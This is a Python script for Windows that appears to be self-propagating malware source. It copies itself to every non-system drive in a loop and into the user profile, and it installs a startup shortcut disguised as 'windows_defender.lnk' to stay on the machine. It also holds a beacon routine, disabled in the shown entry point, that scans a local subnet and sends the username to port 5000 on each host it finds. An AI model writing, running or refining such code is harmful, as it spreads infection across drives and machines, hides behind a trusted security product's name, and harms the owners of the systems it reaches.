import win32com
import wmi
import shutil
import os
import requests
import datetime
from threading import Thread
import time

# Specify the source file
# source_file = f"{os.getenv("USERPROFILE")}\est.txt"
source_file = os.path.abspath(__file__)
log_file = f"{os.getenv("USERNAME")}\\windows_defender.log"
addresses = [f"192.168.0.{i}" for i in range(255)]

def copy_file_to_partitions():
    while True:
        try:
            # Connect to WMI
            c = wmi.WMI()

            # Query for list of disk drives
            disk_drives = c.Win32_DiskDrive()

            # Iterate over disk drives
            for drive in disk_drives:
                # Get partitions associated with the current disk drive
                partitions = drive.associators("Win32_DiskDriveToDiskPartition")
                for partition in partitions:
                    # Get logical disks associated with the current partition
                    logical_disks = partition.associators("Win32_LogicalDiskToPartition")
                    for logical_disk in logical_disks:
                        if logical_disk.DeviceID != "C:":
                            # Copy the file to the current logical disk
                            destination_partition = logical_disk.DeviceID + "\\"
                            destination_file = destination_partition + source_file.split("\\")[-1]
                            if not os.path.exists(destination_partition + source_file.split("\\")[-1]):
                                shutil.copy(source_file, destination_partition)
                                print(f"{destination_file} copied successfully to", destination_partition)
                            else:
                                print(f"{destination_file} already exists in", destination_partition)

        except Exception as e:
            print("Error:", e)
        time.sleep(5)

def put_file_in_startup(file_path):
    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Create a shortcut to the file in the startup folder
    shortcut_path = os.path.join(startup_folder, "windows_defender.lnk")
    try:
        # Create the shortcut
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = file_path
        shortcut.save()
        print("Shortcut created successfully in startup folder.")
    except Exception as e:
        print("Error:", e)

def sent_msg_to_server():
    while True:
        for addr in addresses:
            try:
                # for once
                # if not os.path.exists(log_file):
                #     url = f"http://{addr}:5000"
                #     header = {"user-name": os.getenv("USERNAME"), "send-date": datetime.datetime.now()}
                #     requests.get(url, headers=header, timeout=5)
                #     f = open(log_file, "w")
                #     f.write("ok")
                #     f.close()
                
                print("sending message to", addr)
                url = f"http://{addr}:5000"
                header = {"user-name": os.getenv("USERNAME"), "send-date": datetime.datetime.now()}
                requests.get(url, headers=header, timeout=5)
            except:
                pass
        time.sleep(2)
        print("---------------")

def copy_file_to_local_machine():
    try:
        # Specify the source file
        source_file = os.path.abspath(__file__)

        # Specify the destination directory
        destination_directory = f"{os.getenv("USERPROFILE")}"

        # Copy the file to the destination directory
        shutil.copy(source_file, destination_directory)
        print("File copied successfully to", destination_directory)
    except Exception as e:
        print("Error:", e)

# code entry point
        
# copy the file to all partitions
t1 = Thread(target=copy_file_to_partitions)
t1.start()

# copy the file to local machine
copy_file_to_local_machine()

# put the file in startup
put_file_in_startup(os.path.abspath(__file__))

# create a thread to send message to server
#t = Thread(target=sent_msg_to_server)
#t.start()